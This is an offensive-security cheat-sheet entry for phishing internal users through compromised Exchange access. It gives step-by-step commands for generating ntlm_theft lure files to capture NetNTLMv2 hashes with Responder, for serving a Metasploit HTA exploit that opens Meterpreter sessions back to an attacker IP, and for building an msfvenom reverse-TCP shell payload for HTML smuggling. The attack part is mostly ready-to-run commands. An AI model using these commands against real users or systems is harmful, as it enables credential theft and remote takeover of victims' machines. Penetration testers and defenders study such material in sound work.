# 17.03 Exchange Phishing ntlm_theft Hash Stealing HTA Payload

> Phish internal users with `ntlm_theft` lures (21 file types) for NetNTLMv2 capture or HTA-server payloads for Meterpreter callbacks.

## Overview

After gaining Exchange access, phish internal users to steal NTLMv2 hashes or achieve RCE. ntlm_theft generates 21 file-type lures (htm, docx, pdf, etc.) that trigger SMB auth when opened. Metasploit hta_server delivers a Meterpreter payload via a malicious HTA link sent by email.

## Steps

- ntlm_theft -g <filetype> -s <attacker_IP> -f <basename> generates the lure file
- Start Responder to capture NTLMv2 authentication triggered when the victim opens the file
- Metasploit hta_server module generates a URL; send the URL to target via Exchange email
- Once victim clicks, Meterpreter session opens back to attacker
- Responder HTTP server also captures credentials if victim visits an embedded hyperlink
- msfvenom creates a payload; base64 encode it for HTML smuggling delivery

## Commands

### Generate ntlm_theft lure

```bash
git clone -q https://github.com/Greenwolf/ntlm_theft
```

### Start Responder to capture hashes

```bash
sudo responder -I tun0
```

### HTA server for arbitrary execution

```bash
msfconsole -x "use exploit/windows/misc/hta_server; set LHOST 10.10.14.207; set LPORT 8443; set SRVHOST 10.10.14.207; run -j"
```

### msfvenom payload + base64 for HTML smuggling

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.92 LPORT=9001 -f exe > shell.exe
```
